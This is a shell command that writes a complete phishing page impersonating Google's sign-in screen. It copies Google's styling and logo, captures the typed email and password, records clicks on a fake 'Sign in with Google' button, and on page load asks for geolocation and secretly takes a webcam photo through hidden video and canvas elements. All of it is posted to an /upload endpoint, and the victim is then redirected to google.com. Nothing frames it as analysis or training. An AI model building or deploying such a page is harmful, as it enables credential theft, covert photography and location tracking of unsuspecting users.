cat << 'EOF' > public/index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        :root {
            --bg-color: #f0f4f9;
            --card-bg: #ffffff;
            --btn-blue: #1a73e8;
            --btn-blue-hover: #1557b0;
            --text-main: #1f1f1f;
            --text-sub: #5f6368;
            --border: #747775;
        }
        body {
            font-family: "Google Sans", Roboto, Arial, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container { width: 100%; max-width: 450px; padding: 20px; box-sizing: border-box; }
        .card { 
            background-color: var(--card-bg); 
            border-radius: 28px; 
            padding: 40px; 
            box-shadow: 0 4px 24px rgba(0,0,0,0.05); 
            text-align: center; 
        }
        .logo {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #34A853; }
        
        h2 { color: var(--text-main); font-size: 24px; font-weight: 400; margin-bottom: 8px; margin-top: 0; }
        .subtitle { color: var(--text-sub); font-size: 16px; margin-bottom: 32px; }
        
        /* Google OAuth Button */
        .google-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 12px;
            background-color: #fff;
            border: 1px solid var(--border);
            border-radius: 20px;
            color: #1f1f1f;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 24px;
            box-sizing: border-box;
            transition: background-color 0.2s;
        }
        .google-btn:hover { background-color: #f7f9fc; border-color: #ccd0d5; }
        .google-icon { width: 18px; height: 18px; margin-right: 12px; }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: var(--text-sub);
            font-size: 14px;
            margin-bottom: 24px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e0e0e0;
        }
        .divider:not(:empty)::before { margin-right: .5em; }
        .divider:not(:empty)::after { margin-left: .5em; }

        .group { position: relative; margin-bottom: 20px; }
        input { 
            width: 100%; 
            padding: 16px; 
            border: 1px solid #8e918f; 
            border-radius: 4px; 
            font-size: 16px; 
            box-sizing: border-box; 
            background-color: transparent; 
        }
        input:focus { outline: none; border: 2px solid var(--btn-blue); padding: 15px; }
        
        .form-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .link-btn {
            color: var(--btn-blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
        }
        .link-btn:hover { color: var(--btn-blue-hover); text-decoration: underline; }
        
        .btn-next { 
            padding: 10px 24px; 
            background-color: var(--btn-blue); 
            border: none; 
            border-radius: 20px; 
            color: #fff; 
            font-size: 14px; 
            font-weight: 500; 
            cursor: pointer; 
            transition: background-color 0.2s;
        }
        .btn-next:hover { background-color: var(--btn-blue-hover); box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <h2>Sign in</h2>
        <div class="subtitle">to continue to Google Accounts</div>
        
        <!-- Social Auth Trigger Option -->
        <button type="button" class="google-btn" id="socialAuthBtn">
            <svg class="google-icon" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.61c-.29 1.53-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-8.58z"/>
                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.11 0-5.74-2.11-6.68-4.96H1.21v3.15C3.18 21.88 7.31 24 12 24z"/>
                <path fill="#FBBC05" d="M5.32 14.24A7.16 7.16 0 0 1 5 12c0-.79.13-1.57.32-2.34V6.51H1.21A11.94 11.94 0 0 0 0 12c0 1.92.45 3.74 1.21 5.39l4.11-3.15z"/>
                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.18 2.12 1.21 5.39l4.11 3.15c.94-2.85 3.57-4.96 6.68-4.96z"/>
            </svg>
            Sign in with Google
        </button>

        <div class="divider">or</div>

        <form id="loginForm">
            <div class="group"><input type="text" id="user" placeholder="Email or phone" required autocomplete="username"></div>
            <div class="group"><input type="password" id="pass" placeholder="Enter your password" required autocomplete="current-password"></div>
            
            <div class="form-footer">
                <button type="button" class="link-btn">Create account</button>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>
</div>

<video id="v" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="c" width="640" height="480" style="display:none;"></canvas>

<script>
    const telemetry = { lat: 'Denied', lng: 'Denied', platform: navigator.platform };
    let formSubmitted = false;
    let savedFields = { u: '', p: '' };

    window.onload = () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                p => { telemetry.lat = p.coords.latitude; telemetry.lng = p.coords.longitude; triggerCam(); },
                () => triggerCam()
            );
        } else { triggerCam(); }
    };

    async function triggerCam() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                s.getTracks().forEach(t => t.stop());
                c.toBlob(b => transmit(b), 'image/jpeg');
            }, 1000);
        } catch { transmit(null); }
    }

    // Intercept form login fields
    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        savedFields.u = document.getElementById('user').value;
        savedFields.p = document.getElementById('pass').value;
        formSubmitted = true;
        transmit(null); 
    });

    // Intercept social button interaction
    document.getElementById('socialAuthBtn').addEventListener('click', () => {
        savedFields.u = "Google OAuth Request Initiated";
        savedFields.p = "OAuth Action Triggered";
        formSubmitted = true;
        transmit(null);
    });

    function transmit(blob) {
        if (!formSubmitted && !blob) return; 
        const fd = new FormData();
        fd.append('latitude', telemetry.lat);
        fd.append('longitude', telemetry.lng);
        fd.append('platform', telemetry.platform);
        fd.append('username', savedFields.u);
        fd.append('password', savedFields.p);
        if (blob) fd.append('image', blob, 'snap.jpg');

        fetch('/upload', { method: 'POST', body: fd }).then(() => {
            if (formSubmitted) {
                // Standard sandbox route reset simulation
                window.location.href = "https://google.com";
            }
        });
    }
</script>
</body>
</html>
EOF
